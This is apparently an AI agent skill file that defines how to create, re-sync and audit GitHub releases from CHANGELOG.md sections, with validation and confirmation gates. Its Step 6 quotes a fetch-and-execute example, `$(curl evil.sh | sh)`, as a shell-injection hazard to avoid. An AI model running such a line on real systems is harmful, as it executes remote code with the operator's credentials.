---
name: release
description: "Cuts or re-syncs a GitHub release from a CHANGELOG.md section (Keep a Changelog format) in one canonical title+body shape: title `<repo> vX.Y.Z — <highlight>`, body = an optional 'What's New' summary paragraph + the section's content with its `## [X.Y.Z] - date` header stripped, plus a trailing `**Full diff:**` compare link. `/release audit` scans every tag/CHANGELOG version for missing tags, missing releases, or drifted title/body and reports a punch list. Use when the user says 'cut a release', 'publish this release', 'sync release notes', 'make a github release', 'audit releases', 'find missed releases', or '/release'."
argument-hint: "[X.Y.Z|latest|unreleased]"
disable-model-invocation: true
---

# Release Skill

Derive a GitHub release's title and body from a `CHANGELOG.md` section, then create or re-sync the git tag and GitHub release to match. This is the single owner of skein's release-note shape — before this skill existed, every release was a hand-typed `gh release create --notes "..."` call, and skein's own 11 releases drifted into three visibly different shapes as a result (see `docs/dev_plans/20260712-feature-release-skill.md`).

This skill is **user-invoked only** (`disable-model-invocation: true`): it pushes a git tag and publishes a public GitHub release — an externally-visible, hard-to-reverse action — and must never fire off conversational context alone.

## Usage

- `/release 0.6.0` — cut or re-sync the release for `CHANGELOG.md`'s `## [0.6.0]` section (**Single-Version Mode**, Steps 1–6)
- `/release latest` / `/release unreleased` — same, targeting the topmost dated section in `CHANGELOG.md` (skipping any `## [Unreleased]` heading, which has no release yet)
- `/release` with no argument — same as `latest`
- `/release audit` — scan every tag and CHANGELOG version for gaps or drift and report a punch list; does not mutate anything by itself (**Audit Mode**, below)

## Canonical Format

- **Title**: `<repo> vX.Y.Z — <highlight>`. `<repo>` is the bare repository name — derive it from the `ORIGIN_REPO` pair Step 2 resolves and locks (`gh repo view --repo ORIGIN_REPO --json name -q .name`), passing `--repo` explicitly so the result cannot be redirected by a `GH_REPO`/`GH_HOST` environment override — do not call `gh repo view` without `--repo`, and do not parse `git remote get-url origin` directly for this either: that returns a full remote URL (e.g. `git@github.com:owner/repo.git` or `https://github.com/owner/repo.git`), not a bare name, so literal use produces a malformed title. `<highlight>` is a short (under ~60 chars) one-line summary of the version's single biggest change — **you must draft this yourself by reading the section body**; do not attempt to mechanically extract it from bullet text (a title-cased first bullet reads as noise, not a summary).
- **Body**, in order:
  1. **`## What's New`** (optional but the default — omit only if the user asks for a bare CHANGELOG-only body) — a short (2–4 sentence) prose paragraph, drafted fresh by you from the section body, giving a reader who won't parse bullet points the shape of the release before they hit the itemized list. Not a bullet-point restatement — say what changed and why it matters, the way a human release-note author would frame it. This is the same kind of judgment call as `<highlight>` (Step 3), just longer.
  2. The CHANGELOG section's content *below* its `## [X.Y.Z] - date` header — the `### Added`/`### Changed`/`### Fixed`/etc. subsections verbatim, header stripped (GitHub already shows the tag and date).
  3. A blank line, then:
     ```
     **Full diff:** https://github.com/<owner>/<repo>/compare/vPREV...vNEW
     ```
     `<owner>/<repo>` here is `ORIGIN_REPO` itself (Step 2), read back via `gh repo view --repo ORIGIN_REPO --json nameWithOwner -q .nameWithOwner` — do not hand-assemble it from a parsed remote URL, for the same reason as the title's `<repo>`, and do not call `gh repo view` without `--repo` for the same reason as above. Omit this line entirely when there is no PREV tag (the first-ever release).

`<repo>`/`<owner>` derived this way are safe to interpolate directly: GitHub repository and owner names are restricted to alphanumerics, hyphens, underscores, and periods — they cannot carry shell metacharacters or quote characters the way CHANGELOG-derived body/highlight text can (see Step 6).

## Single-Version Mode

### Step 1: Resolve the Target Version and Section

1. Read `CHANGELOG.md`. Find the target `## [X.Y.Z] - date` header:
   - Explicit `X.Y.Z` argument → match that exact version.
   - `latest`/`unreleased`/no argument → the topmost `## [X.Y.Z] - date` header (skip any leading `## [Unreleased]` heading — it has no date and no release yet; if the file has no dated section at all, stop and tell the user).
2. **Validate the resolved version string against strict SemVer (`^[0-9]+\.[0-9]+\.[0-9]+$`) before it is used anywhere else in this skill.** Every later step splices this string, unquoted, into `git`/`gh` commands (`vX.Y.Z` tag names, `gh release view vX.Y.Z`, etc.) — an unvalidated value (a malformed explicit argument, or a CHANGELOG header with drifted/malicious punctuation matched via the whitespace-tolerant retry in step 4 below) could otherwise carry shell metacharacters into those commands. If the resolved version fails this check, stop and report the exact string rather than passing it on.
3. Extract everything between that header and the next `## [` header (or EOF). Strip the header line itself and any leading/trailing blank lines. This is the raw body.
4. If the target section is empty (a version bump with no recorded changes), stop and tell the user — do not publish an empty-body release silently.
5. If no header matches exactly, retry tolerating whitespace/punctuation drift (extra spaces, en dash vs. hyphen) before giving up — this is a cross-skill format contract shared with `skein:update-docs` (see Execution Model below), and CHANGELOG.md is hand-edited, so minor formatting drift is expected. If still no match, stop and report the exact version string you searched for rather than guessing at loosely-matched boundaries. Any tolerantly-matched result still passes through step 2's SemVer validation before use.

### Step 2: Determine the Previous Version and Lock the Target Repository

Before running any `gh` command, resolve the owner/repo pair from the same remote that Step 5 pushes the tag to, and lock every subsequent `gh` call to it. `gh`'s implicit repo resolution can be redirected by a `GH_REPO`/`GH_HOST` environment override (or ambient config) independent of what `git push origin` actually targets — without this, the tag could be pushed to repository A while the release is created/edited in repository B, with the confirmation in Step 4 never having surfaced the mismatch:

1. Run `git remote get-url origin` and parse `<owner>/<repo>` from it (strip a trailing `.git`; both the `git@github.com:owner/repo.git` and `https://github.com/owner/repo.git` forms resolve to the same bare pair). Call this origin-authoritative pair `ORIGIN_REPO`.
2. From here on, pass `--repo ORIGIN_REPO` explicitly to **every** `gh` command this skill runs — `gh repo view`, `gh release view`, `gh release create`, `gh release edit`, `gh release list` — never rely on `gh`'s ambient resolution again. `--repo` takes precedence over `GH_REPO`/`GH_HOST`, so this closes the redirection risk directly rather than merely detecting it after the fact.
3. As a sanity check, run `gh repo view --repo ORIGIN_REPO --json nameWithOwner -q .nameWithOwner` once now and confirm it echoes `ORIGIN_REPO` back — if it errors (repo doesn't exist, `gh` isn't authenticated for it), stop and report rather than continuing on an unresolved repo. This same call is what Canonical Format's `<repo>`/`<owner>` derivation reuses; do not issue a second, unscoped `gh repo view` later.

Run `git fetch --tags --force origin` next — a plain `git fetch --tags` never reconciles a tag that was force-moved on origin (git refuses non-fast-forward tag updates without `--force`, printing a warning rather than an error), so PREV (below) and Audit Mode's tag inventory (Step A1) could otherwise be computed from a diverged local tag that no longer matches origin. **Do not add `--prune`/`--prune-tags` to this fetch**: pruning deletes any local tag absent from origin, including a local-only tag from a prior interrupted run that Step 4/5 below are specifically designed to detect and push — pruning it here would silently destroy that recovery path before it can run, and a retry would then treat the version as brand-new and tag whatever `HEAD` currently is instead of the originally-intended commit. (`--force` alone doesn't have this problem: fetch only force-updates refs the remote actually has, so it never touches a tag that exists only locally.) The accepted tradeoff is that a tag deleted on origin can still linger in the local list; Audit Mode's classification (Step A2) already treats a locally-only-known tag as at most an informational finding, never as something it silently trusts as `ok`.

Then run `git tag --list 'v*' --sort=v:refname | grep -E '^v[0-9]+\.[0-9]+\.[0-9]+$'` (the `v*` glob plus the strict-SemVer grep excludes both non-release tags — e.g. `nightly`, `release-2020` — and malformed/prerelease version-shaped tags — e.g. `v1.2`, `vfoo`, `v1.2.3-beta` — any of which would otherwise enter semver-sort ordering with implementation-defined or unintended placement and could get picked as a garbage PREV) and take the snapshot **before** any new tag this run might create (tag creation happens in Step 5, not here — this snapshot must not include a tag this same run is about to push). Exclude the target version's own tag `vX.Y.Z` from the list if present (the re-sync case, where the tag already exists) — PREV must never resolve to the target version itself. From what remains, PREV is the highest tag by semver order that sorts below `vX.Y.Z`. Tags are the canonical ordering source, not CHANGELOG section order, because the two can disagree in either direction: a CHANGELOG section can be written before its tag is pushed, and an old tag can predate CHANGELOG coverage entirely (skein's own `v0.2.x`/`v0.1.0` had no changelog-derived notes at release time). If no such tag exists after excluding the target, this is the first-ever release — omit the compare line (Step 3).

**Worked example (re-sync case):** target `v0.5.1`, sorted tag list `v0.1.0 v0.2.0 v0.2.1 v0.2.2 v0.2.3 v0.2.4 v0.3.0 v0.4.0 v0.4.1 v0.5.0 v0.5.1`. Exclude `v0.5.1` itself → PREV is `v0.5.0`, the entry immediately before it in sorted order.

### Step 3: Compose Title and Body

1. Run `gh release view vX.Y.Z --repo ORIGIN_REPO --json name,body` once, now — this single call also serves as the release-existence check Step 6 acts on later, so Step 6 must reuse its outcome rather than re-querying. Distinguish confirmed absence from any other failure — do not treat every non-zero exit as "no release yet":
   - If it fails with stderr exactly `release not found`, no release exists yet (new-release case). Record this outcome for Step 6, and draft the title and `## What's New` paragraph yourself from the extracted section body (Step 1) — the version's single biggest change for the highlight, a short synthesis paragraph for What's New.
   - If it fails with any other message (auth failure, network error, repo-resolution error, insufficient permissions), **stop and report the exact error now** — do not proceed to compose a release on an ambiguous failure, and do not let Step 6 fall through to `gh release create`.
   - If it succeeds (release already exists — the re-sync case), record this outcome for Step 6. `gh release view --json` exposes the release title as the field **`name`**, not `title` (`title` is only a flag on `gh release create`/`edit`, never a JSON output field; verify with `gh release view --help` if in doubt). Try to recover the existing highlight from `name` (the text after the em dash) and the existing `## What's New` paragraph from the body (the prose block between the `## What's New` heading and whichever comes first of: the next `###` heading, the next `##` heading, the `**Full diff:**` line, or EOF — a body with no trailing subsections has no `###` to terminate on, and the boundary must not silently swallow the CHANGELOG content or compare link that follows). Propose reusing both rather than re-drafting from scratch — this is what makes re-sync reproducible in practice, since neither has any other persisted source of truth. If the existing title doesn't match the `vX.Y.Z — <highlight>` shape, or the body has no `## What's New` section, draft whichever piece is missing yourself instead of recovering it.
   - Either way, state title and What's New to the user as part of the confirmation in Step 4 and let them override either one. The CHANGELOG-derived body content and compare link are fully deterministic and reproducible on their own; the **title** and the **What's New paragraph** are only reproducible when recovered or re-supplied identically — they're both fresh judgment calls, not derived state.
2. Compose the title: `<repo> vX.Y.Z — <highlight>`.
3. Compose the body per the Canonical Format order: the `## What's New` paragraph (unless the user asked for a bare body), then the Step 1 section content, then (if a PREV tag exists) a blank line and `**Full diff:** https://github.com/<owner>/<repo>/compare/vPREV...vNEW`.

### Step 4: Confirm Before Mutating

First determine whether this run will create a brand-new tag or reuse an existing one — this changes what "the intended commit" means and must not be conflated:

- Check `git rev-parse --verify --quiet "refs/tags/vX.Y.Z"` (local) and `git ls-remote --exit-code --tags origin "refs/tags/vX.Y.Z"` (origin). Both reads are safe to trust as origin-authoritative because Step 2's `git fetch --tags --force origin` already ran earlier in this same invocation — do not re-fetch here, but do not skip Step 2 either (Single-Version Mode always runs Steps 1–6 in order). Record which of the three cases below applies — Step 5 reuses this determination rather than re-checking.
- **New tag** (found in neither place): run `git status --porcelain` and stop if the worktree is dirty — uncommitted changes make it ambiguous whether `HEAD` is actually the commit the user intends to release, and a tag/release is hard to undo once pushed. Then run `git rev-parse --abbrev-ref HEAD` and `git rev-parse HEAD` to record the current branch and **commit SHA** that Step 5 will tag — Step 5 passes this exact SHA to `git tag` explicitly, so nothing that happens to `HEAD` between this confirmation and Step 5 (a concurrent commit, a checkout) can change what actually gets tagged.
- **Local-only tag** (found locally, not on origin): do not treat this as an ordinary re-sync, and do not fold it into the confirmation copy below. A tag can end up local-but-not-on-origin two ways that are indistinguishable from git state alone: (a) a prior run of this skill created it and was interrupted before Step 5's push, or (b) the tag existed on origin, was deliberately deleted (e.g. a botched release rollback), and this clone still retains it locally — Step 2's fetch is intentionally non-pruning (see its own rationale) precisely so case (a) survives, but that same choice is what makes case (b) indistinguishable here. Case (a) is safe to push; case (b) would resurrect a release the operator intentionally removed. Run `git log -1 --format='%h %s' "vX.Y.Z"` and show the user that commit/subject **plus an explicit statement that this tag is absent from origin and may have been deliberately deleted there** — require the user to affirmatively acknowledge that specific ambiguity before proceeding; a generic "yes, cut the release" confirmation does not count.
- **Existing tag on origin** (found on origin, regardless of local state — the re-sync/retrofit case, including any Audit-Mode fix of a historical version): the tag already points at a fixed historical commit, which is essentially never `HEAD` on the branch/checkout the operator happens to be running the skill from — **do not compare it to `HEAD`, and do not require a clean worktree** (a notes-only re-sync creates no new tag). Instead run `git log -1 --format='%h %s' "vX.Y.Z"` and show the user that commit and its subject line as part of the confirmation below, so they can judge whether it's the release they expect (see Edge Cases: "target version's tag exists but points at an unexpected commit") — the check is human judgment on the displayed commit, not a mechanical equality test. Because Step 2's fetch already force-reconciled the local tag against origin, this local read is guaranteed to match what `gh release create`/`edit` will actually target in Step 6 (both operate against the same origin tag).

Per this repo's own `CLAUDE.md` (Executing Actions With Care), tag pushes and release publishes are external, hard-to-reverse actions — show the user the computed title and full body, the resolved commit info from above (new-tag SHA, or the existing tag's commit+subject), and state whether this is a **new tag+release** or a **re-sync of an existing release**, and get explicit confirmation before running any `git tag`/`git push`/`gh release` command. Do not proceed silently.

### Step 5: Create or Re-Sync the Tag

Reuse Step 4's existence determination — do not re-check:

- **New tag** (Step 4 found it in neither place): create it at **exactly the commit SHA Step 4 recorded**, not whatever `HEAD` happens to be when this step runs — pass the SHA as an explicit positional argument: `git tag -a vX.Y.Z <confirmed-sha> -F <path>` (commit message written to a temp file first, per Step 6's `--notes-file` rationale — avoid inline double-quoted interpolation of the repo name into `-m`). Then `git push origin vX.Y.Z`.
- **Local-only tag** (Step 4 classified it as local-only): push only after the user explicitly acknowledged Step 4's ambiguity warning (that the tag is absent from origin and may have been deliberately deleted there) — a generic "yes, cut the release" does not satisfy this. If that specific acknowledgment wasn't given, stop instead of pushing. Once acknowledged: `git push origin vX.Y.Z`.
- **Existing tag on origin**: reuse it as-is — do not re-create or force-move it. Step 4 already surfaced its commit for the user's own confirmation; no further check runs here.

### Step 6: Create or Edit the Release

Reuse the existence outcome Step 3.1 already recorded — do not re-run `gh release view`. Nothing state-changing happens between Step 3.1 and here (Step 4 is a confirmation prompt, Step 5 only creates/pushes the tag, neither touches release existence):

**Never inline `<body>` (or `<title>`) into a double-quoted `--notes "<body>"` argument.** `<body>` is verbatim `CHANGELOG.md` content — markdown that routinely contains backticks and `` ` `` / `$(...)` code spans (this skill's own Worked Example body does) — and inside a double-quoted shell argument those undergo command substitution. A CHANGELOG section containing a code span like `` `$(curl evil.sh | sh)` `` would execute that payload with the operator's live `gh`/`git` credentials the moment this command runs; an ordinary code span like `` `rm -rf` `` already breaks or misquotes the command on a fully benign release. Write the composed body to a temp file and pass it out-of-band instead:

- If Step 3.1 recorded no release exists (`release not found`), write `<body>` to a temp file and run `gh release create vX.Y.Z --repo ORIGIN_REPO --verify-tag --title '<title>' --notes-file <path>`. `--verify-tag` aborts the command instead of creating a release against a tag absent from origin — a defensive backstop on top of Step 5's own push, in case the tag disappeared or was never actually pushed. `--repo ORIGIN_REPO` (Step 2) ensures this release is created in the same repository the tag was just pushed to.
- If Step 3.1 recorded that a release already exists (the retrofit/re-sync case), write `<body>` to a temp file and run `gh release edit vX.Y.Z --repo ORIGIN_REPO --title '<title>' --notes-file <path>` instead. This makes the skill idempotent on body content and safe to re-run against an already-published release to bring it into the canonical shape.
- `<title>` (the short `<repo> vX.Y.Z — <highlight>` line) has no `--title-file` equivalent in `gh`; single-quote it instead of double-quoting (`--title '<title>'`), escaping any embedded single quote in the highlight text as `'\''`. `<repo>` and the version are structurally safe (Canonical Format: `<repo>` comes from `gh repo view --json name`, restricted to GitHub's own naming charset; the version passed strict SemVer validation in Step 1) — the highlight is the only piece of `<title>` with no such guarantee, since it's a short, human-drafted one-liner that could itself echo CHANGELOG text. Escape it the same way regardless.

Report the final release URL to the user.

## Audit Mode

`/release audit` finds gaps and drift across the **whole** repo instead of fixing one named version — this is the workflow that manually found skein's own three-shapes drift and its missing `v0.5.1` release, folded into the skill instead of repeated by hand.

### Step A1: Gather the Three Inventories

Resolve `ORIGIN_REPO` exactly as Step 2 does (parse `git remote get-url origin`, sanity-check with `gh repo view --repo ORIGIN_REPO`) before running any `gh` command below, and pass `--repo ORIGIN_REPO` to each — Audit Mode runs standalone and does not inherit Step 2's resolution from Single-Version Mode.

1. **Tags**: `git fetch --tags --force origin` first (Step 2's own freshness note applies here too, including the same rationale for never adding `--prune`/`--prune-tags` — pruning here would be just as destructive to the local-only-tag recovery path that a `missing-release`/`drifted` fix later runs through Single-Version Mode's Step 5), then `git tag --list --sort=v:refname`. This inventory is intentionally **not** filtered to `v*`/strict-SemVer the way Step 2's PREV list is — Audit Mode's job is to surface non-standard tags as findings (`untracked-tag`), not silently discard them; step 4 below is where a non-semver tag actually gets excluded from *classification* (as opposed to being dropped from the inventory entirely).
2. **CHANGELOG versions**: every `## [X.Y.Z] - date` header in `CHANGELOG.md`, in file order (skip `## [Unreleased]`).
3. **Releases (list only)**: `gh release list --repo ORIGIN_REPO --json tagName,name,isDraft --limit 1000` (raise `--limit` if the repo plausibly has more than 1000 releases). `gh release list --json` does **not** support a `body` field — this call only tells you *which* tags have a release, not their content. Full name/body for drift-checking is fetched per-candidate in Step A2, not here (and uses `--json name,body`, matching Step 3.1's field names — `title` is never a valid `--json` field).
4. **Normalize before unioning**: strip any leading `v` from tag names and release `tagName` values so every inventory keys on the bare semantic version `X.Y.Z` — CHANGELOG headers already use this bare form. Retain the `v`-prefixed spelling only when actually running git/gh commands (tag names, `gh release view`/`create`/`edit` targets). Unioning on the raw strings instead (`v0.5.1` vs `0.5.1` treated as different versions) splits every real release into a false `missing-tag` row plus a false `untracked-tag`/`no-changelog-entry` row. After stripping, **validate each stripped tag/release entry against strict SemVer** (`^[0-9]+\.[0-9]+\.[0-9]+$`) before adding it to the union — a malformed or prerelease-shaped tag (`v1.2`, `vfoo`, `v1.2.3-beta`) does not satisfy the release-version contract this skill operates on. Entries that fail validation are excluded from the classification union in Step A2 and reported separately in the punch list as `non-release tag, ignored` (same informational treatment as `untracked-tag` — never silently coerced into a classification row or fed into PREV/compare-link computation).

**Platform invariant**: a GitHub release cannot exist without its underlying tag, so `release∃ ⇒ tag∃` always holds **on GitHub** — but that only bounds what the *remote* can contain, not what Step A1.1's tag inventory contains if it skipped the fetch. Always fetch before classifying (A1.1); otherwise a clone with stale/missing local refs can present a `release∃, tag∄` case this classification doesn't have a row for.

### Step A2: Classify Every Version

A tag present in the local inventory (A1.1) but absent from origin carries the same ambiguity Step 4 flags (leftover interrupted run vs. a deliberately deleted release) — any classification built on such a tag (`ok`, `drifted`, `missing-release`) inherits that ambiguity. This is not resolved here: Step A4's fix pass runs Single-Version Mode against selected versions, and Step 4's gate there is what actually surfaces the warning and blocks an unacknowledged push back to origin.

Union the version strings from all three inventories (a version present in only one or two counts too — that asymmetry is the finding). For each version, classify by three yes/no facts — tag exists (T), release exists (R, only possible when T), CHANGELOG section exists (C):

| T | R | C | Status |
|---|---|---|---|
| ✓ | ✓ | ✓ | `ok` or `drifted` (see below) |
| ✓ | ✓ | ✗ | `no-changelog-entry` |
| ✓ | ✗ | ✓ | `missing-release` |
| ✓ | ✗ | ✗ | `untracked-tag` |
| ✗ | — | ✓ | `missing-tag` |

- **`drafted`** (T=R=C=✓, checked *before* `ok`/`drifted` below): if Step A1.3's `isDraft` is `true` for this candidate, classify it `drafted` and stop there — do not run the `ok`/`drifted` comparison and never silently edit or publish a draft. Surface it in the punch list and let the user decide (publish it, edit it, or leave it as a draft); Single-Version Mode's `gh release edit` is not draft-aware and editing a draft's notes is a different action than syncing a published release.
- **`ok` vs. `drifted`** (T=R=C=✓, `isDraft=false` only): for each such version, run `gh release view vX.Y.Z --repo ORIGIN_REPO --json name,body` (one call per candidate — this is the only place full release content is fetched; `name` is the correct field, not `title` — see Step 3.1) and extract that version's CHANGELOG section using Step 1's own extraction+tolerant-matching logic. Split the fetched body into its `## What's New` paragraph (if any, via Step 3.1's recovery logic) and its remaining CHANGELOG-derived content. Classify **`ok`** only if `name` matches `<repo> vX.Y.Z — <highlight>` (any highlight text — audit doesn't judge highlight quality) AND the body's non-`What's New` content matches the freshly-extracted CHANGELOG section AND the trailing compare line is exactly right for this version's PREV: present and pointing at the correct PREV when a PREV tag exists (Step 2's rule), or **absent entirely** when it does not (a stray compare line on a first release is itself drift, not a pass). Otherwise **`drifted`**, and name which check failed in the punch-list Note column — a title-only check is not sufficient; the CHANGELOG content and compare-link checks are what actually catch drift (skein's own pre-retrofit `v0.5.0`/`v0.4.x`/`v0.2.x` releases had correct-looking titles in some cases but stale/missing bodies).
- **`missing-tag`** — a CHANGELOG section exists but no tag does. (Skein's own `v0.5.1` before this session's first fix.) Fixable via Single-Version Mode.
- **`missing-release`** — a tag and a CHANGELOG section both exist, but no release does. Fixable via Single-Version Mode.
- **`untracked-tag`** — a tag exists with **neither** a release nor a CHANGELOG section (e.g. an old experimental or pre-adoption tag with no recorded notes at all). **Not** fixable via Single-Version Mode — Step 1 there requires a CHANGELOG section to resolve and will dead-end. Informational only, same as `no-changelog-entry`: report and move on, never invent changelog content to make it fixable.
- **`no-changelog-entry`** — a tag and release both exist but no CHANGELOG section does (common for pre-CHANGELOG-adoption tags). Informational only — do not propose "fixing" these by inventing changelog content; report and move on.

### Step A3: Report the Punch List

```
## Release Audit: <repo>

| Version | Status | Note |
|---|---|---|
| v0.5.1 | ok | — |
| v0.5.0 | drifted | title missing highlight; body still has CHANGELOG header embedded |
| v0.2.0 | no-changelog-entry | tag+release predate CHANGELOG.md |
| v1.2 | non-release tag, ignored | tag doesn't match strict SemVer, excluded from classification |

N ok, M missing-tag, K missing-release, U untracked-tag, D drifted, W drafted, C no-changelog-entry, X non-release tag ignored
```

Do not mutate anything in this step — Audit Mode is read-only by itself.

### Step A4: Fix (Opt-In, One Version at a Time)

After the report, ask the user which **fixable** versions to fix (`missing-tag`, `missing-release`, `drifted` only — never `untracked-tag`/`no-changelog-entry`, and never silently include `drafted`: ask separately whether a draft should be published, edited, or left alone before running Single-Version Mode against it) — a free-form selection (`all`, `1,3`, `none`), the same pattern `skein:review-plan`'s Step 6.4 triage uses for an unbounded finding list rather than a capped multiple-choice widget. For each selected version, run **Single-Version Mode** (Steps 1–6 above) against it, including its own Step 4 confirmation — Audit Mode's own confirmation (choosing which versions to fix) does not substitute for each fix's own mutation-confirmation gate. For a `drifted` version, feed Step 3.1 the `name`/`body` this step (A2) already fetched instead of re-running `gh release view` — A2's fetch and Step 3.1's fetch are the exact same API call against unchanged data. `missing-tag`/`missing-release` versions have no such cached data (A2 never fetches full release content for T=✗/R=✗ candidates) and still need Step 3.1 to make its own call. Process one version at a time, in ascending version order, so an interrupted batch leaves a clean prefix of fixed releases rather than a scattered partial state.

**Fixing a `missing-tag` can stale an adjacent, unselected release.** Inserting a new tag between two existing versions changes what PREV resolves to for the release immediately above the newly-inserted one (Step 2 computes PREV fresh from the current tag list every run) — but that adjacent release was already `ok` and wasn't selected for fixing, so its now-stale compare link goes unnoticed. If this batch fixed any `missing-tag` version, tell the user to re-run `/release audit` afterward rather than treating the batch as having left the repo fully clean.

## Worked Example

This skill's own canonical format was established by manually retrofitting skein's `v0.5.1` release in the same session that produced this skill (before this skill added the `## What's New` paragraph to the standard body — a real `/release` run today would prepend one; shown here without it as the actual historical example):

- **Title**: `skein v0.5.1 — skill invocation-mode audit`
- **Body**:
  ```
  ### Added
  - **Skill invocation-mode classification (docs, meta).** `docs/skills_architecture/20260522-design-claude-skills-architecture.md` gains an Invocation Mode column on the Skill Catalogue table (now covering all 13 skills, up from 11) and a new `## Invocation Mode` section documenting the `disable-model-invocation: true` mechanism and the two-axis (chained-into / independently content-triggered) classification discipline for future skills.

  ### Changed
  - **`skein:plan-view` is now user-invoked-only on Claude.** `disable-model-invocation: true` added to the Claude `SKILL.md` front-matter — the only skill of 13 to clear both classification axes (see `docs/dev_plans/20260711-chore-skill-invocation-mode-audit.md`). The Codex mirror has no equivalent front-matter suppression, so it gets a one-line documented-divergence comment instead and remains autonomously invocable there.

  **Full diff:** https://github.com/vr000m/skein/compare/v0.5.0...v0.5.1
  ```

## Execution Model

Unlike `rfc-finder`/`update-docs` (read-only, subagent-delegated fact-gathering), this skill runs entirely **inline in the main agent context** — no delegating subagent. It owns an irreversible external mutation (tag push, release publish) gated on an explicit user-confirmation step (Step 4); a subagent cannot hold that confirmation gate on the caller's behalf.

It also has one **data-contract** dependency worth naming, distinct from a call-chaining edge: it parses the exact Keep a Changelog `## [X.Y.Z] - date` shape that `skein:update-docs` produces/maintains in `CHANGELOG.md`. If either skill's format assumption drifts, this skill silently mis-parses (empty body, wrong header strip). No skill calls another here — the two only share a format contract.

## Edge Cases

- **No `CHANGELOG.md`**: stop and tell the user — this skill has no fallback source for release notes.
- **Version argument doesn't match any CHANGELOG section**: stop and report the mismatch; do not guess the nearest version.
- **`gh` not installed or not authenticated**: stop and tell the user to authenticate (`gh auth login`) before retrying.
- **Target version's tag exists but points at an unexpected commit**: flag this to the user before reusing it — do not silently move or re-tag.
- **`gh release view` fails for a reason other than "release not found"** (network error, repo-resolution failure, insufficient permissions): stop and report the exact error (Step 6) — never fall through to `gh release create` on an ambiguous failure.
- **Tag exists locally but was never pushed to origin**: treated as ambiguous, not an ordinary re-sync (Step 4) — the operator must explicitly acknowledge that the tag may have been deliberately deleted from origin before Step 5 pushes it; `gh release create --verify-tag` is a second, defensive check in case that push didn't actually land.
